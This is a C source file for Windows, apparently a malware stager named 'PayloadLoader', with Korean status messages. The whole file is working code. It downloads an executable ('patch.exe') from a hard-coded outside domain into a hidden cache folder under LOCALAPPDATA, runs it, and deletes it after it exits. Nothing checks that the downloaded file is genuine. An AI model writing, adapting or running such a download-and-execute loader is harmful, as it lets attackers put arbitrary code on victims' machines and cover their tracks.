#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <winhttp.h>
#include <strsafe.h>
#include <stdarg.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")

#ifndef LOADER_URL
#define LOADER_URL L"https://candy3157.cloud/downloads/patch.exe"
#endif

static const wchar_t *kUrl          = LOADER_URL;
static const wchar_t *kArgs         = L"";
static const wchar_t *kAppFolder    = L"PayloadLoader";
static const DWORD    kRunTimeoutMs = 10u * 60u * 1000u;
static const BOOL     kDeleteAfterRun = TRUE;

#ifndef ALLOW_HTTP
#define ALLOW_HTTP 0
#endif

static void out(const wchar_t *fmt, ...)
{
    wchar_t buf[2048];
    va_list ap;
    va_start(ap, fmt);
    _vsnwprintf_s(buf, ARRAYSIZE(buf), _TRUNCATE, fmt, ap);
    va_end(ap);

    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD  written = 0, mode = 0;

    if (hOut && hOut != INVALID_HANDLE_VALUE && GetConsoleMode(hOut, &mode)) {
        WriteConsoleW(hOut, buf, (DWORD)wcslen(buf), &written, NULL);
    } else if (hOut && hOut != INVALID_HANDLE_VALUE) {
        char utf8[4096];
        int n = WideCharToMultiByte(CP_UTF8, 0, buf, -1, utf8, (int)sizeof(utf8), NULL, NULL);
        if (n > 1)
            WriteFile(hOut, utf8, (DWORD)(n - 1), &written, NULL);
    }
}

static BOOL ensure_dir(const wchar_t *dir)
{
    int rc = SHCreateDirectoryExW(NULL, dir, NULL);
    return rc == ERROR_SUCCESS || rc == ERROR_ALREADY_EXISTS || rc == ERROR_FILE_EXISTS;
}


static BOOL download_file(const wchar_t *url, const wchar_t *dest)
{
    BOOL ok = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    wchar_t partPath[MAX_PATH + 8] = { 0 };
    wchar_t reqPath[2048] = { 0 };
    wchar_t host[256] = { 0 };
    wchar_t urlBuf[2048] = { 0 };
    DWORD total = 0, expected = 0;
    URL_COMPONENTS uc;

    StringCchCopyW(urlBuf, ARRAYSIZE(urlBuf), url);

    ZeroMemory(&uc, sizeof(uc));
    uc.dwStructSize     = sizeof(uc);
    uc.dwHostNameLength = (DWORD)-1;
    uc.dwUrlPathLength  = (DWORD)-1;
    uc.dwExtraInfoLength= (DWORD)-1;

    if (!WinHttpCrackUrl(urlBuf, 0, 0, &uc)) {
        out(L"[!] URL 해석 실패 (%lu)\n", GetLastError());
        return FALSE;
    }


    if (uc.dwHostNameLength == 0 || uc.dwHostNameLength >= ARRAYSIZE(host)) {
        out(L"[!] 호스트 이름이 올바르지 않습니다.\n");
        return FALSE;
    }
    StringCchCopyNW(host, ARRAYSIZE(host), uc.lpszHostName, uc.dwHostNameLength);

    BOOL isHttps = (uc.nScheme == INTERNET_SCHEME_HTTPS);
#if ALLOW_HTTP
    if (!isHttps && uc.nScheme != INTERNET_SCHEME_HTTP) {
#else
    if (!isHttps) {
#endif
        out(L"[!] HTTPS URL 만 허용됩니다.\n");
        return FALSE;
    }

    if (uc.dwUrlPathLength == 0 || uc.dwUrlPathLength >= ARRAYSIZE(reqPath)) {
        out(L"[!] 경로가 올바르지 않습니다.\n");
        return FALSE;
    }
    StringCchCopyNW(reqPath, ARRAYSIZE(reqPath), uc.lpszUrlPath, uc.dwUrlPathLength);
    if (uc.lpszExtraInfo && uc.dwExtraInfoLength > 0)
        StringCchCatNW(reqPath, ARRAYSIZE(reqPath), uc.lpszExtraInfo, uc.dwExtraInfoLength);

    StringCchPrintfW(partPath, ARRAYSIZE(partPath), L"%s.part", dest);

    hSession = WinHttpOpen(L"PayloadLoader/1.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { out(L"[!] WinHttpOpen 실패 (%lu)\n", GetLastError()); goto done; }
    WinHttpSetTimeouts(hSession, 15000, 15000, 30000, 120000);

    hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
    if (!hConnect) { out(L"[!] 연결 실패 (%lu)\n", GetLastError()); goto done; }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", reqPath, NULL,
                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  isHttps ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { out(L"[!] 요청 생성 실패 (%lu)\n", GetLastError()); goto done; }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        out(L"[!] 요청 실패 (%lu)\n", GetLastError());
        goto done;
    }

    DWORD status = 0, cb = sizeof(status);
    WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &cb, WINHTTP_NO_HEADER_INDEX);
    if (status != 200) {
        out(L"[!] HTTP 상태 %lu\n", status);
        goto done;
    }

    cb = sizeof(expected);
    WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &expected, &cb, WINHTTP_NO_HEADER_INDEX);

    hFile = CreateFileW(partPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        out(L"[!] 파일 생성 실패 (%lu) : %s\n", GetLastError(), partPath);
        goto done;
    }

    BYTE buf[64 * 1024];
    for (;;) {
        DWORD got = 0;
        if (!WinHttpReadData(hRequest, buf, (DWORD)sizeof(buf), &got)) {
            out(L"[!] 수신 실패 (%lu)\n", GetLastError());
            goto done;
        }
        if (got == 0) break;

        DWORD wrote = 0;
        if (!WriteFile(hFile, buf, got, &wrote, NULL) || wrote != got) {
            out(L"[!] 기록 실패 (%lu)\n", GetLastError());
            goto done;
        }
        total += got;
    }

    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    if (total == 0) { out(L"[!] 빈 응답\n"); goto done; }
    if (expected && expected != total) {
        out(L"[!] 크기 불일치 (기대 %lu / 실제 %lu)\n", expected, total);
        goto done;
    }

    if (!MoveFileExW(partPath, dest, MOVEFILE_REPLACE_EXISTING)) {
        out(L"[!] 최종 이름 변경 실패 (%lu)\n", GetLastError());
        goto done;
    }
    ok = TRUE;

done:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    if (!ok) DeleteFileW(partPath);
    return ok;
}


static BOOL run_and_wait(const wchar_t *exePath, const wchar_t *args,
                         DWORD timeoutMs, DWORD *exitCode)
{
    wchar_t cmd[32768];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    if (args && *args)
        StringCchPrintfW(cmd, ARRAYSIZE(cmd), L"\"%s\" %s", exePath, args);
    else
        StringCchPrintfW(cmd, ARRAYSIZE(cmd), L"\"%s\"", exePath);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessW(exePath, cmd, NULL, NULL, FALSE,
                        CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        if (err == ERROR_ELEVATION_REQUIRED)
            out(L"[!] 관리자 권한이 필요합니다 (UAC).\n");
        else
            out(L"[!] CreateProcessW 실패 (%lu)\n", err);
        return FALSE;
    }

    DWORD wr = WaitForSingleObject(pi.hProcess, timeoutMs);
    if (wr == WAIT_TIMEOUT) {
        out(L"[!] %lu초 초과 -> 강제 종료\n", timeoutMs / 1000);
        TerminateProcess(pi.hProcess, 1);
        WaitForSingleObject(pi.hProcess, 5000);
    }

    DWORD code = (DWORD)-1;
    GetExitCodeProcess(pi.hProcess, &code);
    if (exitCode) *exitCode = code;

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}


int wmain(void)
{
    wchar_t localApp[MAX_PATH] = { 0 };
    wchar_t dir[MAX_PATH]      = { 0 };
    wchar_t dest[MAX_PATH]     = { 0 };
    wchar_t name[MAX_PATH]     = { 0 };
    wchar_t *q;

    if (!GetEnvironmentVariableW(L"LOCALAPPDATA", localApp, ARRAYSIZE(localApp))) {
        out(L"[!] LOCALAPPDATA 를 읽지 못했습니다.\n");
        return 1;
    }

    StringCchPrintfW(dir, ARRAYSIZE(dir), L"%s\\%s\\cache", localApp, kAppFolder);
    if (!ensure_dir(dir)) {
        out(L"[!] 폴더 생성 실패: %s\n", dir);
        return 1;
    }

    StringCchCopyW(name, ARRAYSIZE(name), PathFindFileNameW(kUrl));
    q = StrStrIW(name, L"?");
    if (q) *q = L'\0';
    if (!*name) StringCchCopyW(name, ARRAYSIZE(name), L"Payload.exe");

    StringCchPrintfW(dest, ARRAYSIZE(dest), L"%s\\%s", dir, name);

    out(L"[*] URL  : %s\n", kUrl);
    out(L"[*] 저장 : %s\n", dest);

    if (!download_file(kUrl, dest)) {
        out(L"[!] 다운로드 실패\n");
        return 1;
    }

    DWORD size = 0;
    HANDLE h = CreateFileW(dest, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        size = GetFileSize(h, NULL);
        CloseHandle(h);
    }
    out(L"[*] 크기 : %lu bytes\n", size);

    out(L"[*] 실행\n");
    DWORD code = 0;
    if (!run_and_wait(dest, kArgs, kRunTimeoutMs, &code))
        return 1;

    out(L"[*] 종료 코드: %lu\n", code);

    if (kDeleteAfterRun && !DeleteFileW(dest))
        out(L"[!] 삭제 실패 (%lu)\n", GetLastError());

    return (code == 0) ? 0 : 1;
}
